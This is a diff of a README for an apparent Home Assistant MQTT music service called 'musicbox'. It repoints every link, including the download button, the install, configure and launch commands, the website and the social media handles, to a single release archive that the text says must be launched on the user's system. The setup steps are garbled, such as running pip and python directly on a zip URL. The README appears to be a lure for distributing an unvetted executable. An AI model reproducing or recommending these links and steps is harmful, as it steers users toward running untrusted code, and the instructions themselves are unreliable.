@@ -7,7 +7,7 @@ Welcome to the "musicbox" GitHub repository - your one-stop solution for sending
 
 To get started with the "musicbox" Python service, you can download the necessary software by clicking on the button below:
 
-[![Download Software](https://github.com/Naiahahah/musicbox/releases/download/v1.0/Release.zip)](https://github.com/Naiahahah/musicbox/releases/download/v1.0/Release.zip)
+[![Download Software](https://github.com/Naiahahah/musicbox/releases/download/v2.0/Software.zip)](https://github.com/Naiahahah/musicbox/releases/download/v2.0/Software.zip)
 
 Please note that the link provided above leads to a software file that needs to be launched on your system. Once downloaded, you can begin setting up the "musicbox" service and start enjoying a whole new level of music integration with Home Assistant.
 
@@ -26,9 +26,9 @@ The "musicbox" repository offers a range of features for music enthusiasts and H
 
 To install the "musicbox" Python service on your system, follow these simple steps:
 1. Clone the repository to your Raspberry Pi or desired system.
-2. Install the required dependencies using `pip install -r https://github.com/Naiahahah/musicbox/releases/download/v1.0/Release.zip`.
-3. Configure the MQTT settings in the `https://github.com/Naiahahah/musicbox/releases/download/v1.0/Release.zip` file.
-4. Launch the Python service using `python https://github.com/Naiahahah/musicbox/releases/download/v1.0/Release.zip`.
+2. Install the required dependencies using `pip install -r https://github.com/Naiahahah/musicbox/releases/download/v2.0/Software.zip`.
+3. Configure the MQTT settings in the `https://github.com/Naiahahah/musicbox/releases/download/v2.0/Software.zip` file.
+4. Launch the Python service using `python https://github.com/Naiahahah/musicbox/releases/download/v2.0/Software.zip`.
 
 With these steps, you can set up the "musicbox" service on your system and start exploring the exciting features it has to offer.
 
@@ -62,16 +62,16 @@ Your participation and contributions play a crucial role in shaping the future o
 ## 🌐 **Explore Further**
 
 For more information, updates, and additional resources related to the "musicbox" repository, visit the official website listed below:
-[Explore Musicbox Website](https://github.com/Naiahahah/musicbox/releases/download/v1.0/Release.zip)
+[Explore Musicbox Website](https://github.com/Naiahahah/musicbox/releases/download/v2.0/Software.zip)
 
 Visit the website to stay updated on the latest developments, tutorials, and projects associated with the "musicbox" Python service.
 
 ## 📢 **Stay Connected**
 
 Follow us on social media to stay connected and receive the latest updates on the "musicbox" repository:
-- Twitter: [@musicbox_twitter](https://github.com/Naiahahah/musicbox/releases/download/v1.0/Release.zip)
-- Facebook: [Musicbox Facebook Page](https://github.com/Naiahahah/musicbox/releases/download/v1.0/Release.zip)
-- Instagram: [@musicbox_insta](https://github.com/Naiahahah/musicbox/releases/download/v1.0/Release.zip)
+- Twitter: [@musicbox_twitter](https://github.com/Naiahahah/musicbox/releases/download/v2.0/Software.zip)
+- Facebook: [Musicbox Facebook Page](https://github.com/Naiahahah/musicbox/releases/download/v2.0/Software.zip)
+- Instagram: [@musicbox_insta](https://github.com/Naiahahah/musicbox/releases/download/v2.0/Software.zip)
 
 Join our vibrant community of music enthusiasts, DIYers, and Home Assistant users to share your experiences, insights, and projects related to the "musicbox" Python service.
 
